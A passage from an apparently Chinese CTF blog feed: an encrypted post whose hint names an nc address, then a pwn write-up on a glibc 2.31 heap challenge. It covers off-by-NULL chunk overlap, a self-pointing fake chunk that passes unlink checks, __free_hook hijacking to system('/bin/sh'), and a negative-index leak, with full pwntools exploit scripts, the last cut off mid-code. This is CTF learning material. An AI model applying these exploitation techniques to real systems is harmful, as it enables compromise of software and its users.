    <link href="/2022/07/04/%E4%B8%8D%E6%83%B3%E6%8B%BFflag%E4%BA%86%EF%BC%8C%E6%83%B3%E8%A6%81shell/"/>
    <url>/2022/07/04/%E4%B8%8D%E6%83%B3%E6%8B%BFflag%E4%BA%86%EF%BC%8C%E6%83%B3%E8%A6%81shell/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="再试试nc看看" data-whm="禁止修改">  <script id="hbeData" type="hbeData" data-hmacdigest="2324444c0c9e0b6d4f8a1df287c4d2e744bd05e60f944d5c77bef77a24b1ab6d">cc0c0f8ba411acd26894e584ac9b5fdaa20ff2900fe7d80c1056c5376dd8b1f15c7e5d8392f021f29b8c00ddeba5864cef4eaaeb15b98ab0e35244ff9f8546fcbc3b28b9ed0e8a84bf29b3b23d0c8cb6046ef58d78ede7cf2a5c776240145a3f77971e7d030b75436707d840b4203e1808ff52d97b895d3a14c8cbfd4480b74e285f3b61576e07a11fe73b0c210ae33855435e8024413289068f36b683a30ff1a1abe70e5648c9c8211c212b8a7fdbe04349cc3a8708c39e84498353c64e0eb1fb8fbcd62dae0efade3136d13e6ab05413055b17cddda9a0221d35a87f153d050002dd0d4973bb378e16bdce2515150d47aaf5c97ecc2c67f16a38606b8506aa75d53cafaa35d3764c97bd3fa6ad2d4b57975a3a2f894ef8e06ec6282277a4675798e1c5ffb70d56f7979ecc4d87f49931429252e67712051d359ca41d81e5d6326eafce050de342d7006e314e8c00e55fcfd3a337cdcdece45078203d7d1a3d868ea34c31c1cc6cbe1b0612b1344702fe2ad6ff1fc2cb80a8e1e92b30a9cde39fbe73a1c23e55fc1344023dd98cf7d4fb7ad14e632b415517f29feacc19c9100719765d8963a2071951aabb2950896ce6ec1523f44ab84f1871b440fd4864fe593b1113f4ac4cbfbe40c13e0ab0032719c943faf346c7a6726767e20344c02dca739e9f210af22bab483a862a2e5a17589d2392d9ab9f991a4046f0373d6249a739e424bdadb396d8fce8648f890b2dcf9c4dc2ab2f1a45e00a28c84b216e9d4dfd1abc10cd48e8bc63e174c6096533211d51843078fe9bc9345c26504ce3c9922748ce5f2bf81e37d0337e57f8cd92229245c667a092cb7d45ba667aca9c6b557820d98d7f5c2313431b4cc7a482d0dfff26d72975ec1044d7eae9bfae4f0ce4865ad933832808bf54e3ad2951fc9ba1bbd21ee0d49a2ffb614b34e41b134e37b7def5d4ddb00d043ab7d96c005e0e59aa84e4ff5d3b9ec9d3be71f2598e2d3deba68e57b1dc23674c18eba0171d42f4de2255af8e3fe009ab9341e0c20071cfe6c9380b15745e0abaad8710e4eba215b72686c42cd4d6047d74c85824f57339bb111e3c5e6dc40fd3f47c34e27cb72c6b01b05a921252bb731a250cd09d801fb39df46d73f4e39bc5e23bfc18df983e12b884e5f11bd5067c26a0339da557284b68d8b58cd2bfc38ba701e649d35148c09112c3a307ec7ce42a77893459d15ac8a83a492855af81f30003389afcab2482d32fbc5ec2a8d6c5ecbae88a92599696f8de39407a6252034e42ece408560f3acfff0574172335128fda24778ea4ef2738fc1f199672d88407d08c49311871ed9c1145567febed09dd86a9b75af812f4316f281b8433164d7928aec6e86de9f47dfe679b96f0eae124d19ee8e5ba9df265f588ad8b45fd28c595264d0aebbbe53c080f5b1947352d4078b235fdc9fe515e7a371c9ae983bee8fcc868bd770ad6f192e80f7632cd5aa8107967c5e137f98fd369544bff4109b5c7725bbe4707dc066a4709001cab60b3b98f757979ff49500ea2825e0f68492a4504d82c066c42d553b275e40ebbeab566f540a21fe54d2d9eb5d3375663df6866ee263f6162551e091ad9b38756d478cc4725adc983d0d9ffc75fec28ba9118ed8177bfbce3c0e04558615a31fb790af9a8d17146ba2c1e887a3175ca29b0f95752355d7836d3d34622cb8671f3551c9a7c644d79c1b0882b070893c35b1214c82626a0969863bf7d36b1a757a96a7dc55df469076ac45f036ebf1d8c2dba8428b63464ae977e6ec6146f910c159d6075ead8325b3cfc38217a58c7624b5b0bc6a226078ef225243b71a0f01d615c1b4be5def9b99e3f763c1186aeb25779e3a5c8664c15163280769705ca297af4be85a83a89a1dbedea88dd6379c4b0b9d3b768532c35ca1e25a8a5212cb9c988fa2abff56b6e940993999a38928e1ef795e64e806fb8bcd2be05cfbd68797e8242cd33e8e48bede7aae09afc3a9bed44b776bdd8f7394c6e3d8c14707c7cf8a61477a5ea325bc12756b3d3d829c8fa31a3780477ff71c9788c8dc2c39ca150ca39898b8c6d664aea6f147550c25b00c51c6565fdba51e1cc8cac36100172a80be34758ccf06f7da2f71ab69ff5c50c5480162f571368302a95bf25246be1b9c926893e2dd67f1cdce45df667542c53bdf649d4500fd37fae9b5639d1f85471bc660ac66ba34b87d2eac795dcaa2d489419165193315f647a41250fdb5298ae0b591db118f9a4472b605975fa736b17a19b34a630d4172e96cf6c17d49be469f26796c392c8cc0be21510c8ef34ad53057ff2a90d1717c62ef3e0288d37b55d5e7111fac506c09d7522431ef97f67f7eeab2e3ddd06692d606b7c82c794152c4a73a4cdf8a03c0c24e9b2d8099723ede703c6b81fedd0be117d44d45285a77dde6a703a260a4b98e13ee58cad03766b60fc7671e5cfa76f237553e1341378bef0836f378c5ffeccb51fba1955edf130fd407516134c53546df4715c5abac6754eaa306e4d2dacafc09ae55880d264fcf4c4d1fd05ddd6baf6d0357b04808fab5d6f3cdc17fe17430fd44a099542ab3234139ad7b607e8985b02ace4b55b14e65cf6609e793766553aa3eab350ccd194f5f4ce4a35fc42cdbee38aceb31edc298d3779b9efef3341f96d5508113d1387eb57ae199b0fa7c941be33981029ecf3c2dd1d847ee6c094f60b30a7d8f6f89d69303b24ac76d56da4f45da2bb8b6aeb6c7fd5c55cbb704555a5bef65299c662fb5a53d65125003b53e9e82b93927ac9158d78f628863cfbd82b5faf48ffe6c44b47e303857e925ab6c14896f121f402a28149c804e0e166868dc0ef38a5b017a7faaeeb46d572f10ba35b3b372c4e77eada3d34e035bbdc3045d1249189a445a2eb19876a9c9eef945513e21699c5dc3cde5eab53008763bd4c2cb6db8417e412acdb503a1a1ea387212d05cbbd898ba3cd5607341230111ea2dc7c7412d627cb7c4eb7510ce064ab9271d6ab05b31a6a7ed6a0d49de3691ece10ee5703491f8dee2ac4c1821147c6ffc3478e98b3532a660d63dd61f233b8ab535c35271c2cf0998de84db49a6b66fdc47842999abdd22bbf2f8c8240441d5160bf090d56bc2a5fe6453ef596c0ba9c38e9764c2dc153bd81a810cf49c85b43c71faf8b625f005fe33ff5623dc8899a2e9e88a11e6622310f489c5017bc9affc52a3ac11eec1aff17c6d7457eb2eee033b940899dfb588e852c54b450f88d94a5d5f4ed0ba64efe5e1263f171a96691ef36712abd5bb1d91d4f2992ae7e026fc7fe82beeb3611d52039d9bd9fcf21f855ba0b7b5ee191201991d72a84c4fd3f68754f4dca9471970264c79dc5c6bcfe10bce89150ce39973cc0e15b976f6ba8d899bbbf26f5990df223ea6fd22313293ae5d7a8044ead1ac71e8754d908bc5f0dd82f2eff3d6a3bbe0b7a79c097f7e9218ac4a56c95c3fe453a2168080df142a31f5843bcb9c1ce57f5c98b28e3a5af01e2e17075e97a042c5023d31ef2923455007ee8b34949e96f8dff040da11c0993380d3ff79e7108acd7c62477ea3e60e613b75170d3911b9c2dfead357fbd840111917f16e114e001a54c35afbc42b7db8da3306e1804bc1793e407d653e089fb99f0c92d7743eaca2736c4d84338e95aca67a17a062e27b40f35da1ff4c5bc7f99f0c0580bfe2efae9d8e0bd703899218f56890b30650e31619284cbed19c159f7b08d0040498e739bfa0336eb8adf5dde09adfd73e00221c9111ceaf1da1c4ed4bd094596d73bcc9b8306a6c95e070a57e17b8b3602a9d06558989bb69d9408d5bf69179e824c62b1161c0bdd61cfc6851878a8c204b6f63ca55ec736f1defbf77e0bce7a5f860e1d2921fd18a8bafe0bd929d95c3a7b6053a7e01f550ef98d903cc397416e832bbb4a85d23e2a081cb31d089f41f1b9db5b500b3b5f8c41b965015c57a89f79c8513b714bdecea6c8779cf1de5798b3e6b399e08d83a695f99eefc65a619f2725696d76c085dc1c938de8d43c17fbce9c8248af3892ad4b62ca54bac27bd85671a2a05b490ac1d5ab069931b16d30d16edb510d830b215388c4ee1cf7206c49818a0171f87661b862d58fc4b5896aab498db09e8ae875bd4c71ef8f0ad7a9610ffb93439c773935cdf7b7d75e8155b5acc44fb79b7c74f9b13d5040c0bf9473740fd91715c3d5fa9b0bc7cc8dc70ed7b999bbc2bbe2db4c8fb3645760017362f1d1cc71db402ed5c071f4527d82a73719facf203dd950430a230bab271caa789f00afaae62d4e347606ec55179959620d248fc4dcd4bc4314b134520ad0ff605bd127d5c6d46d5ac80b09f5ebce801302f5f9ed7b48b037a6dd2cc55a20894ff12b6b996ad1290821a972915e8f597db19f406ee0819587c490615135d0040a7e8ddf8b13303713cdda932c38233d79610fbb9f9e288737dc00e8f950dc030d3db5e1e95e60c6f80196e573fa1fef9a868996d4105bd657768643e5a32ae518f4a43cd0a53c97242d4d7b2e1f5aa1e41d24ed4f2afc6f5ce82a796bf5ed3eaa517b477f8faccc83ce7206cd3adc83eb188012b11eded6ccbfe8f5e37541391fb5714fb4ea57173980079d833180d75104cf3500c4ca4e0fe2c6c5311c361e3619efb436031e7c85e63debb359766e1dee43ede089a50bdaa3fe72fa28eb714e2d5ac926ef6a767eae50e3f92e37cd15adb5ba3ae38d191bc2813c92bb68f9feea867a1a7aa77b5c4e5bd2d92f055554d2c3c36c8896839a0f14b4c86438968b83bcbd3c5b72f7c1ea86e456eed2832d2976d869db4e14a092d787e36f0275f0901402b8b99e8a0e77666fae4d3a0dc69a124c2f7960725d41d351c62614e82d6c08a7e8b59c8706b7e1651b0001fed23022455cf757adca8d0b1d3665b5bce9f779ea378e1aebcf6f66680a85c366bc58707af205cebe70da9528714f54efa255d07b3a7fc7bad05467970629b464831ae62e61f7903b8bb1436c8df166b88ddd86a7d26f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">chat nc 43.96.147.93</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>chats</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于没做出来的这个pwn</title>
    <link href="/2022/06/30/%E5%85%B3%E4%BA%8E%E6%B2%A1%E5%81%9A%E5%87%BA%E6%9D%A5%E7%9A%84%E8%BF%99%E4%B8%AApwn/"/>
    <url>/2022/06/30/%E5%85%B3%E4%BA%8E%E6%B2%A1%E5%81%9A%E5%87%BA%E6%9D%A5%E7%9A%84%E8%BF%99%E4%B8%AApwn/</url>
    
    <content type="html"><![CDATA[<h2 id="感想"><a class="header-anchor" href="#感想">¶</a>感想</h2><p>我感觉我像个傻子，，，，</p><img src="https://i.bmp.ovh/imgs/2022/06/30/60e48556559e2748.png" style="zoom: 67%;" /><p>有些人真的是有点瞎呢，这么明显的一个off_by_NULL，没看出来。。。。</p><p>然后就是overlap的寻常思路，注意2.31下的idx检查。。。。</p><p>虽然但是，2.31属实还是花了我很多时间，很久没刷题还是有很多缺点。</p><p>首先是leak，本来是很简单的，直接打chunk到unsorted bin然后拿出来再leak就行了。但是莫名奇妙，拿出来就不对了。</p><p>然后还是调试最后leak了出来，不知道为啥。</p><img src="https://i.bmp.ovh/imgs/2022/06/30/9cf9355702462588.png" style="zoom:50%;" /><p>然后就是overlap+劫持了。</p><p>这里我谨慎了一波，看了一下许久未看的libc保护机制，2.31下free会检查tcache的key，同时off_by_NULL合并的时候会检查presize和presize§</p><p>这让我想起了很久之前的一篇笔记，这里单拿出来，唠一唠</p><h2 id="高版本的off-by-one"><a class="header-anchor" href="#高版本的off-by-one">¶</a>高版本的off_by_one</h2><p><a href="https://zhuanlan.zhihu.com/p/136983333%E5%8F%AF%E4%BB%A5%E5%9C%A8%E8%BF%99%E9%87%8C%E7%9C%8B2.31%E5%92%8C2.29%E4%BB%A5%E5%90%8E%E7%9A%84%E6%A3%80%E6%9F%A5">https://zhuanlan.zhihu.com/p/136983333可以在这里看2.31和2.29以后的检查</a></p><p>2.29以后就给chunk的unlink加了presize的检查，这就让原来随意利用的off_by_NULL变得不是那么简单，因为size控制不了（除了溢出）这是众所周知的，所以在寻常的unlink上 ，这里多转了一个弯，他既然检查了size和presize，那么我直接在chunk里面伪造一个chunk，那这个fake_chunk的size不就可以控制了吗。</p><p>如此虽然让后面的劫持复杂了1%，但是还是非常好控制的。</p><p>此外由于此处的是伪造chunk，所以必须还要满足一个要求。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        \     <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>fd和bk要合法，因为默认该chunk是在unsorted bin里面的，以前直接free打进去不需要考虑这个，此时伪造则需要考虑。</p><p>一个简单的方法就是fd和bk都指向自己即可。这样就满足了。</p><p>于是就有了以下的做法。</p><p><img src="https://i.bmp.ovh/imgs/2022/07/01/c37768e718d638f6.png" alt=""></p><p>以后的步骤不详细写了，，看exp</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># io=remote("10.75.1.25",58011)</span><span class="token comment">#io= process("./pwn",env=&#123;"LD_PRELOAD":"./libc.so.6"&#125;)</span>p<span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment"># libc = ELF("./libc.so.6")</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token comment"># attach(p)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#put into tcache</span>    free<span class="token punctuation">(</span>i<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7a0</span><span class="token keyword">print</span> <span class="token string">"heap_addr:"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>free<span class="token punctuation">(</span>j<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">592</span> <span class="token operator">-</span> <span class="token number">0x1ecb80</span><span class="token keyword">print</span> <span class="token string">"libc_base=>"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>free<span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">-</span>i<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1f1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x9a0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x9a0</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token comment"># pause()</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#9 uaf</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#key</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#0</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#9 freehook</span>edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="非预期"><a class="header-anchor" href="#非预期">¶</a>非预期</h2><p>这个是重点，当时比赛我就只找到了这个非预期的洞，常见的一个index负溢出，对这个比较敏感，所以当时没看别的洞，这里记录一下是因为，好几次都是这样类型的洞，我都没打出来，因为bss段上的负溢出实在想不出有什么leak的方式，直到这次看到了ayaka师傅的wp，问了一首ayaka，才知道有些东西编译就会带有，所以这里记录一下。</p><p><img src="https://i.bmp.ovh/imgs/2022/07/01/cbdf367cd2911642.png" alt=""></p><p>闭着眼睛打了一场比赛，貌似15名还不错呢，还有个pwn3血 🙂</p><p>服了，这么明显，，，不过也是记住了。。。</p><p>思路就是leak出这个地址，然后根据基址写一个got表地址到这里，然后再leak libc地址，然后直接写hook即可。</p><p>写hook也是一样的思路，先把hook写到上面，然后覆盖即可。</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>p<span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment"># libc = ELF("./libc.so.6")</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">)</span>bss <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\nDone'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token 